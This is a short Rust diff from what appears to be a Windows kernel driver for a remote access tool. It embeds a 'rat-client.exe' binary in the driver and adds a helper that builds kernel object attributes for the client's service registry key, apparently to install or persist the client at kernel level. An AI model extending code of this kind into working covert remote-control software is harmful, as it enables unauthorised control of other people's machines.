@@ -1,6 +1,12 @@
+use core::ptr;
+
 use const_format::formatcp;
 use rat_common::windows::RAT_CLIENT_SERVICE_NAME;
+use wdk_sys::ntddk::RtlInitUnicodeString;
+use wdk_sys::{OBJ_CASE_INSENSITIVE, OBJ_KERNEL_HANDLE, OBJECT_ATTRIBUTES, UNICODE_STRING};
 use widestring::{U16CStr, u16cstr};
+
+use crate::wrappers::bindings::InitializeObjectAttributes;
 
 pub const MAX_INITIALIZE_ATTEMPTS: usize = 50;
 
@@ -40,3 +46,19 @@ pub const RAT_CLIENT: &[u8] = include_bytes!("../../target/debug/rat-client.exe"
 
 #[cfg(not(debug_assertions))]
 pub const RAT_CLIENT: &[u8] = include_bytes!("../../target/release/rat-client.exe");
+
+pub fn registry_key_attributes(name: &mut UNICODE_STRING) -> OBJECT_ATTRIBUTES {
+    let mut attributes = OBJECT_ATTRIBUTES::default();
+    unsafe {
+        RtlInitUnicodeString(name, RAT_CLIENT_SERVICE_REGISTRY.as_ptr());
+        InitializeObjectAttributes(
+            &mut attributes,
+            name,
+            OBJ_CASE_INSENSITIVE | OBJ_KERNEL_HANDLE,
+            ptr::null_mut(),
+            ptr::null_mut(),
+        );
+    }
+
+    attributes
+}
